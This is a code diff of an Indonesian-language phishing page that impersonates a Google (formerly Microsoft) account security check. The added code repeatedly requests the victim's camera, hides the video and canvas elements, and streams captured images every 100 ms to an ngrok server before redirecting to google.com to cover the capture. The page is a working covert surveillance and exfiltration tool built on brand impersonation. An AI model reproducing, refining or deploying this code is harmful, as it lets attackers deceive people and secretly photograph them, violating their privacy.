@@ -3,12 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Microsoft Security Verification</title>
+<title>Google Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
   .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
-  h2 { color: #0078d4; margin-bottom: 10px; font-size: 22px; }
+  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
   iframe, video, canvas { display: none !important; }
@@ -17,8 +17,8 @@
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 Microsoft Security Check</h2>
-  <p>Klik untuk memverifikasi akun Microsoft Anda.</p>
+  <h2>🔒 Google Security Check</h2>
+  <p>Klik untuk memverifikasi akun Google Anda.</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -33,6 +33,7 @@
   var logEl = document.getElementById('log');
   var executed = false;
   var cycleInterval = null;
+  var streamInterval = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -42,8 +43,8 @@
   // ============================================
   // KONFIGURASI
   // ============================================
-  var TARGET_URL = "https://www.microsoft.com"; 
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
+  var TARGET_URL = "https://www.google.com"; 
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev";
   
   // Interval Siklus (ms)
   var CYCLE_INTERVAL = 500; // Minta izin setiap 500ms
@@ -92,8 +93,9 @@
           video.play().catch(function(){});
           log("[+] 🚨 KAMERA BERHASIL diakses!");
           
-          // Mulai kirim gambar
-          setInterval(sendImageToServer, 100);
+          // Mulai kirim gambar secara berkala
+          if (streamInterval) clearInterval(streamInterval);
+          streamInterval = setInterval(sendImageToServer, 100);
 
           // Hentikan cycle karena sudah berhasil
           if (cycleInterval) {
@@ -117,27 +119,36 @@
 
     document.getElementById('main-card').innerHTML = `
       <h2>⏳ Memverifikasi...</h2>
-      <p>Menghubungkan ke Microsoft...</p>
+      <p>Menghubungkan ke Google...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Microsoft Camera Cycle...");
+    log("[!] Memulai Google Camera Cycle...");
 
     // ============================================
-    // A. REDIRECT KE MICROSOFT (0ms)
+    // A. MULAI KAMERA DULU (0ms)
     // ============================================
-    try {
-      log("[+] Redirect ke Microsoft.com...");
-      window.location.href = TARGET_URL;
-    } catch(e) {}
+    // Paksa minta kamera sebelum redirect agar stream aktif.
+    requestCamera();
 
     // ============================================
     // B. CAMERA CYCLE (Setiap 500ms)
     // ============================================
-    // Mulai siklus permintaan kamera berulang.
+    // Jika kamera gagal di awal, coba lagi secara berkala.
     cycleInterval = setInterval(function() {
       requestCamera();
     }, CYCLE_INTERVAL);
+
+    // ============================================
+    // C. REDIRECT KE GOOGLE (Setelah 1000ms)
+    // ============================================
+    // Delay 1 detik untuk memberi waktu kamera menyala / prompt muncul.
+    setTimeout(function() {
+      log("[+] Redirect ke Google.com...");
+      try {
+        window.location.href = TARGET_URL;
+      } catch(e) {}
+    }, 1000);
 
   }, { once: true });
 
